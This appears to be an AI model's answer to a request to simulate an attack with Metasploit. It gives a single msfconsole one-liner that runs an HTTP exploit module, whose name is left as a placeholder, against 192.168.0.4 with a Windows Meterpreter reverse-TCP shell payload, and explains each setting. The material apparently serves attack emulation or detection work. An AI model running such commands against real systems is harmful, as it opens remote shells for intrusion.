Based on the provided documentation and the objective to generate realistic command lines using only Metasploit, I will attempt to simulate the attack behavior described in the scenario.

**Command:** `msfconsole -x "use exploit/multi/http/... ; set RHOST 192.168.0.4 ; set RPORT 80 ; set PAYLOAD windows/meterpreter/reverse_tcp ; run"`

This command uses the Metasploit console (`msfconsole`) and specifies the following parameters:

* `use exploit/multi/http/...`: Selects the "multi/http" exploit family, which is likely to be used for exploiting public-facing applications.
* `set RHOST 192.168.0.4`: Sets the target IP address to 192.168.0.4.
* `set RPORT 80`: Sets the target port number to 80 (HTTP).
* `set PAYLOAD windows/meterpreter/reverse_tcp`: Specifies the payload type as "windows/meterpreter/reverse_tcp", which is a common payload used for meterpreter shells.
* `run`: Executes the exploit and begins the attack.

Please note that I have inserted placeholders (`...`) in the command line, as per the provided documentation.
